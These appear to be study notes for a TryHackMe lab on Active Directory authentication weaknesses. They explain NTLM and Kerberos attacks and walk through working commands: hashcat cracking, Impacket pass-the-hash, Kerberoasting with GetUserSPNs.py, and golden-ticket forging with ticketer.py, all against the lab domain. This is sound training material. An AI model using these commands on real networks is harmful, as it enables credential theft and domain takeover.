# ⚠️ Weaknesses in Active Directory Authentication

> **TryHackMe Room:** Intro to AD Authentication
>
> **Task:** 5 — Weaknesses in AD Authentication

---

# 📖 Overview

Now that we understand how **NTLM** and **Kerberos** authentication work, it is important to understand why this knowledge matters from a security perspective.

Both protocols, whilst functional, have significant weaknesses that attackers can exploit to gain unauthorised access to systems and data.

Despite being decades old, these vulnerabilities remain prevalent in modern Active Directory environments and are actively exploited in real-world attacks.

---

# 🎯 Common Authentication Weaknesses in AD

Active Directory authentication weaknesses can come from:

- Protocol design limitations
- Weak configurations
- Weak passwords
- Poor credential management
- Misconfigured delegation
- Legacy authentication protocols

Understanding these vulnerabilities is essential for both offensive security practitioners and defenders.

---

# 🔴 NTLM-Specific Weaknesses

## 1. Weak Cryptography

NTLM uses the outdated **MD4 hashing algorithm** without salt.

This makes password hashes vulnerable to:

- Rainbow table attacks
- Dictionary attacks
- Brute-force attacks
- Rapid cracking with modern GPU hardware

Because the hashes are unsalted, identical passwords produce identical hashes.

---

## 2. Pass-the-Hash (PtH)

NTLM uses the password hash directly in the challenge-response mechanism.

Therefore, if an attacker obtains a user's NTLM hash, they can authenticate without knowing the plaintext password.

```text
NTLM Hash Obtained
        ↓
Pass-the-Hash
        ↓
Authentication
        ↓
Access
```

The attacker does not need to recover the original password.

---

## 3. NTLM Relay Attacks

NTLM does not provide mutual authentication.

This allows attackers to intercept and relay NTLM authentication attempts to other services.

```text
Victim
   ↓
NTLM Authentication
   ↓
Attacker
   ↓
Relay
   ↓
Target Service
```

The attacker can potentially gain unauthorised access without cracking the credentials.

---

## 4. Downgrade Attacks

Attackers can potentially force systems to fall back from:

```text
Kerberos
   ↓
NTLM
```

NTLM is weaker than Kerberos and therefore exposes the environment to NTLM-specific attacks.

---

## 5. No Mutual Authentication

NTLM cannot verify the identity of the server.

The client authenticates to the server, but the server does not cryptographically prove its identity to the client.

This makes man-in-the-middle attacks easier to execute.

---

# 🟠 Kerberos-Specific Weaknesses

## 1. Kerberoasting

Any authenticated domain user can request service tickets for accounts with registered **SPNs**.

These service tickets are encrypted using the service account's password hash.

An attacker can extract the encrypted ticket and attempt to crack it offline.

If the service account uses a weak password, the attacker may recover the password.

```text
Authenticated User
        ↓
Request Service Ticket
        ↓
TGS-REP
        ↓
Extract Ticket
        ↓
Offline Cracking
        ↓
Service Account Password
```

Service accounts may have elevated privileges, making Kerberoasting particularly valuable for privilege escalation.

---

## 2. AS-REP Roasting

Users with **Kerberos pre-authentication disabled** can be vulnerable to AS-REP Roasting.

An attacker can obtain authentication material that can be cracked offline.

The attack can potentially be performed without prior authentication to the domain.

---

## 3. Pass-the-Ticket (PtT)

Valid Kerberos tickets can be extracted from memory and reused to authenticate as the ticket's owner.

The attacker does not necessarily need to know the user's password.

```text
Kerberos Ticket Obtained
        ↓
Pass-the-Ticket
        ↓
Authenticate as Ticket Owner
```

---

## 4. Overpass-the-Hash

An attacker with a user's NTLM hash can request a Kerberos TGT on behalf of that user.

This effectively converts:

```text
NTLM Hash
    ↓
Kerberos TGT
```

The attacker can then use the resulting Kerberos ticket for authentication.

---

## 5. Golden Ticket Attacks

If an attacker obtains the **KRBTGT account's password hash**, they can forge Kerberos tickets.

These forged tickets can be created for users in the domain, including highly privileged users such as:

```text
Domain Admin
```

This can provide complete and persistent domain control.

```text
KRBTGT Hash
     ↓
Forge TGT
     ↓
Impersonate User
     ↓
Domain Administrator
     ↓
Domain Control
```

---

## 6. Silver Ticket Attacks

Silver Tickets are similar to Golden Tickets, but instead of using the KRBTGT account's hash, the attacker uses a **service account's password hash**.

The attacker can forge service tickets for specific resources without contacting the KDC.

```text
Service Account Hash
        ↓
Forge Service Ticket
        ↓
Specific Service
        ↓
Access
```

---

# 🟡 Configuration-Based Weaknesses

Authentication security can also be weakened by poor Active Directory configuration.

---

## 1. Weak Passwords

Weak user and service account passwords remain one of the most common entry points for authentication attacks.

Common problems include:

- Short passwords
- Common passwords
- Reused passwords
- Predictable passwords
- Old service account passwords

---

## 2. Password Spraying

In a password spraying attack, an attacker attempts a commonly used password against many accounts.

Example concept:

```text
Password123!
     ↓
User01
User02
User03
User04
User05
```

This differs from traditional brute-force attacks because the attacker does not try many passwords against a single account.

Password spraying can sometimes avoid triggering account lockout policies.

---

## 3. Misconfigured Delegation

Improper configuration of:

- Constrained delegation
- Unconstrained delegation

can allow attackers to perform:

- Privilege escalation
- Lateral movement

---

## 4. Stale Credentials

Old or unused accounts can become security risks.

Examples include:

- Old service accounts
- Former employee accounts
- Unused machine accounts

These accounts may have weak or unchanged passwords.

---

# 📊 Authentication Weakness Summary

| Category | Weakness | Main Risk |
|---|---|---|
| NTLM | Weak cryptography | Password cracking |
| NTLM | Pass-the-Hash | Authentication without password |
| NTLM | NTLM Relay | Relayed authentication |
| NTLM | Downgrade | Forced use of weaker protocol |
| NTLM | No mutual authentication | Man-in-the-middle attacks |
| Kerberos | Kerberoasting | Service account compromise |
| Kerberos | AS-REP Roasting | Offline password cracking |
| Kerberos | Pass-the-Ticket | Ticket-based impersonation |
| Kerberos | Overpass-the-Hash | NTLM hash → Kerberos ticket |
| Kerberos | Golden Ticket | Domain-wide compromise |
| Kerberos | Silver Ticket | Service-level compromise |
| Configuration | Weak passwords | Credential compromise |
| Configuration | Password spraying | Account compromise |
| Configuration | Misconfigured delegation | Privilege escalation |
| Configuration | Stale credentials | Easy credential targets |

---

# 🧪 Practical Demonstrations

The TryHackMe task provides hands-on demonstrations of four authentication weaknesses.

The attacks target the file share used in the previous tasks:

```text
SERVER1.thm.loc
192.168.11.51
```

The four demonstrations are:

1. **Weak Password Hashing**
2. **Pass-the-Hash**
3. **Kerberoasting**
4. **Golden Ticket**

Each technique is covered in greater depth in dedicated rooms later in the module.

---

# 1️⃣ Weak Password Hashing

## 📖 Concept

One of the fundamental weaknesses in AD authentication is weak password hashing.

When passwords are stored in Active Directory, they are hashed using the **NTLM hashing algorithm**.

Although hashing prevents passwords from being stored in plaintext, NTLM hashes have a critical weakness:

> **They are calculated without a salt.**

This means identical passwords produce identical hashes.

```text
Password
   ↓
NTLM Hash
```

The same password will therefore produce the same NTLM hash.

This makes hashes vulnerable to:

- Pre-computed hash attacks
- Rainbow tables
- Dictionary attacks
- Brute-force cracking

---

## ⚡ Why This Works

NTLM hashes:

- Are unsalted
- Use the relatively fast MD4 algorithm

Modern password-cracking tools can therefore test very large numbers of candidates quickly using GPU acceleration.

If a user chooses a weak or commonly used password, the hash may be cracked quickly.

Once the password is recovered, the attacker can authenticate normally to services that accept the user's credentials.

---

# 🧪 Practical Demonstration — Cracking an NTLM Hash

The TryHackMe lab provides the following NTLM hash for the user `phillip`:

```text
phillip:1106:aad3b435b51404eeaad3b435b51404ee:939B0058BC6DD834ABC4CC08CFEFEA69:::
```

The standard format is:

```text
username:uid:LM_hash:NTLM_hash:::
```

Therefore, the NTLM hash to crack is:

```text
939B0058BC6DD834ABC4CC08CFEFEA69
```

---

## Step 1 — Save the Hash

Save the NTLM hash to:

```text
hash.txt
```

Contents:

```text
939B0058BC6DD834ABC4CC08CFEFEA69
```

---

## Step 2 — Crack the Hash with Hashcat

The TryHackMe example uses Hashcat mode `1000` for NTLM hashes and the `rockyou.txt` wordlist.

```bash
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
```

---

## Step 3 — Display the Cracked Password

After Hashcat completes:

```bash
hashcat -m 1000 hash.txt --show
```

---

## Step 4 — Authenticate Using the Recovered Password

Use the recovered password with Impacket's `smbclient.py`:

```bash
smbclient.py "thm.loc/phillip:<RECOVERED_PASSWORD>"@192.168.11.51
```

Once connected, navigate to:

```text
SHARE3
```

and retrieve:

```text
flag3.txt
```

---

# 2️⃣ Pass-the-Hash

## 📖 Concept

Even if an NTLM password hash cannot be cracked, the hash itself can often be used directly for authentication.

This is known as:

> **Pass-the-Hash (PtH)**

Because NTLM authentication uses the password hash directly in the challenge-response process, an attacker who obtains the hash does not necessarily need to know the plaintext password.

```text
NTLM Hash
    ↓
Pass-the-Hash
    ↓
NTLM Authentication
    ↓
Access
```

---

## ⚠️ Why This Is Dangerous

Even strong passwords may not protect against Pass-the-Hash if an attacker obtains the corresponding NTLM hash.

Hashes can potentially be obtained from:

- Compromised systems
- Memory
- Credential dumping
- NTLM relay attacks

---

## 🧪 Practical Demonstration

The TryHackMe lab provides the following NTLM hash for the user `ben`:

```text
63CF41DC25C04B8FB79E44B1DEF12C10
```

Unlike the previous example, this hash does not need to be cracked.

Impacket supports Pass-the-Hash authentication directly.

---

## Authenticate Using the Hash

```bash
smbclient.py thm.loc/ben@192.168.11.51 -hashes aad3b435b51404eeaad3b435b51404ee:63CF41DC25C04B8FB79E44B1DEF12C10
```

The `-hashes` parameter follows this format:

```text
LM_hash:NTLM_hash
```

The example uses:

```text
LM Hash:
aad3b435b51404eeaad3b435b51404ee
```

and:

```text
NTLM Hash:
63CF41DC25C04B8FB79E44B1DEF12C10
```

Since LM hashes are rarely used in modern environments, the empty/default LM hash value is supplied followed by the actual NTLM hash.

---

# 3️⃣ Kerberoasting

## 📖 Concept

**Kerberoasting** is an attack that targets service accounts in Active Directory.

When a user requests access to a service, they receive a **Service Ticket (TGS-REP)**.

The ticket is encrypted using the service account's password hash.

An authenticated domain user can request service tickets for services associated with registered **SPNs**, even when they do not actually need access to the service.

```text
Authenticated User
        ↓
Request Service Ticket
        ↓
TGS-REP
        ↓
Extract Ticket
        ↓
Offline Cracking
        ↓
Service Account Password
```

---

## ⚡ Why This Works

Service tickets are encrypted using the service account's password hash.

The ticket can be extracted and subjected to offline password cracking.

If the service account has a weak password, the attacker may recover it.

Service accounts can have elevated privileges, making this particularly useful for privilege escalation.

---

# 🧪 Practical Demonstration

First, identify service accounts with registered SPNs.

The TryHackMe lab uses Claire's account with Impacket's:

```text
GetUserSPNs.py
```

Command:

```bash
GetUserSPNs.py thm.loc/claire:'Password123!' -dc-ip 192.168.11.100 -request
```

Example output:

```text
ServicePrincipalName    Name         MemberOf  PasswordLastSet
----------------------  -----------  --------  --------------------------
http/svc_print.thm.loc  svc_printer
```

The output includes a Kerberos service ticket hash in Hashcat format:

```text
$krb5tgs$23$*svc_printer$THM.LOC$thm.loc/svc_printer*$...
```

The ticket hash begins with:

```text
$krb5tgs$23$
```

---

## Step 1 — Save the Service Ticket

Save the extracted service ticket hash to:

```text
service_ticket.txt
```

---

## Step 2 — Crack the Ticket

Use Hashcat mode `13100` for Kerberos TGS-REP tickets:

```bash
hashcat -m 13100 service_ticket.txt /usr/share/wordlists/rockyou.txt
```

Once cracked, the password for:

```text
svc_printer
```

can be recovered.

---

## Step 3 — Authenticate Using the Recovered Password

Use the recovered password with:

```bash
smbclient.py "thm.loc/svc_printer:<RECOVERED_PASSWORD>"@192.168.11.51
```

Once connected, navigate to:

```text
SHARE5
```

and retrieve:

```text
flag5.txt
```

---

# 4️⃣ Golden Ticket

## 📖 Concept

The **Golden Ticket** attack is one of the most powerful authentication attacks in Active Directory.

It involves forging Kerberos **TGTs** using the password hash of the:

```text
KRBTGT
```

account.

The KRBTGT account is responsible for protecting Kerberos TGTs.

If an attacker obtains the KRBTGT password hash, they can create valid Kerberos tickets for users in the domain.

This can include highly privileged users such as:

```text
Domain Administrator
```

---

## ⚠️ Why Golden Tickets Are Dangerous

Golden Tickets can provide:

- Domain-wide access
- Persistent access
- User impersonation
- Privileged access

They can remain valid even after the original compromise vector has been patched.

The TryHackMe material notes that the tickets remain valid until the **KRBTGT password is reset twice**, because the previous password is also cached.

---

## ⚡ Why This Works

Kerberos TGTs are protected using the KRBTGT account's password hash.

If an attacker obtains this hash:

```text
KRBTGT Hash
     ↓
Forge TGT
     ↓
Impersonate Any User
     ↓
Domain-Level Access
```

The forged ticket can then be presented to Domain Controllers as if it were legitimate.

---

# 🧪 Practical Demonstration

The TryHackMe lab provides the following KRBTGT hash:

```text
e9a9871b93d7b4d73c91665bd6df6e50
```

Domain SID:

```text
S-1-5-21-990021728-513958382-3715561918
```

---

## Step 1 — Forge the Golden Ticket

The lab uses Impacket's:

```text
ticketer.py
```

Command:

```bash
ticketer.py -nthash e9a9871b93d7b4d73c91665bd6df6e50 -domain-sid S-1-5-21-990021728-513958382-3715561918 -domain thm.loc Administrator
```

The command creates a forged ticket for:

```text
thm.loc/Administrator
```

Example output includes:

```text
[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for thm.loc/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in Administrator.ccache
```

---

## Step 2 — Set the Kerberos Credential Cache

The forged ticket is saved as:

```text
Administrator.ccache
```

Set it as the current Kerberos credential cache:

```bash
export KRB5CCNAME=Administrator.ccache
```

---

## Step 3 — Authenticate Using the Forged Ticket

Use Kerberos authentication with `smbclient.py`:

```bash
smbclient.py thm.loc/Administrator@SERVER1.thm.loc -k -no-pass -dc-ip 192.168.11.100
```

When using Kerberos, remember to use:

```text
SERVER1.thm.loc
```

rather than:

```text
192.168.11.51
```

because Kerberos relies on SPNs tied to DNS names.

Once authenticated, navigate to:

```text
SHARE6
```

and retrieve:

```text
flag6.txt
```

---

# 📊 Four Demonstrated Attacks

| Attack | Required Material | Main Technique | Potential Impact |
|---|---|---|---|
| **Weak Password Hashing** | NTLM hash | Offline cracking | Recover plaintext password |
| **Pass-the-Hash** | NTLM hash | Authenticate using hash | Account access |
| **Kerberoasting** | Service ticket | Offline cracking | Service account compromise |
| **Golden Ticket** | KRBTGT hash | Forge TGT | Domain-wide compromise |

---

# 🔄 Attack Relationships

These attacks demonstrate different ways authentication material can be abused.

```text
                    AD Authentication
                           │
             ┌─────────────┴─────────────┐
             │                           │
           NTLM                       Kerberos
             │                           │
      ┌──────┴──────┐              ┌─────┴─────────┐
      │             │              │               │
      ▼             ▼              ▼               ▼
Weak Hash       Pass-the-Hash  Kerberoasting   Golden Ticket
      │             │              │               │
      ▼             ▼              ▼               ▼
 Crack Hash      Use Hash      Crack TGS       Forge TGT
```

---

# 🎯 Understanding the Impact

These four attacks demonstrate why authentication security is critical in Active Directory environments.

Weak passwords, protocol design flaws, and inadequate protection of sensitive credentials can all lead to serious compromise.

The techniques covered in this task are previews of attacks that will be explored in much greater depth in dedicated rooms later in the module.

---

# 🧠 Key Takeaways

- NTLM has significant cryptographic weaknesses.
- Unsalted NTLM hashes can be vulnerable to offline cracking.
- Weak passwords can be recovered from NTLM hashes using password-cracking tools.
- Pass-the-Hash allows authentication using an NTLM hash without knowing the plaintext password.
- NTLM Relay attacks exploit the lack of mutual authentication.
- Kerberoasting targets service accounts with registered SPNs.
- Kerberoasting extracts service tickets that can be cracked offline.
- AS-REP Roasting targets accounts with Kerberos pre-authentication disabled.
- Pass-the-Ticket allows reuse of valid Kerberos tickets.
- Overpass-the-Hash can convert an NTLM hash into a Kerberos TGT.
- Golden Ticket attacks require compromise of the KRBTGT hash.
- Golden Tickets can be used to impersonate users and achieve domain-wide access.
- Silver Tickets use service account hashes to forge service tickets.
- Weak passwords remain a major authentication weakness.
- Password spraying can compromise accounts without repeatedly targeting a single account.
- Misconfigured delegation can enable privilege escalation and lateral movement.
- Stale accounts can provide additional attack opportunities.
- Authentication security is critical because compromise of authentication material can lead to serious Active Directory compromise.

---

# 📚 References

- TryHackMe — Intro to AD Authentication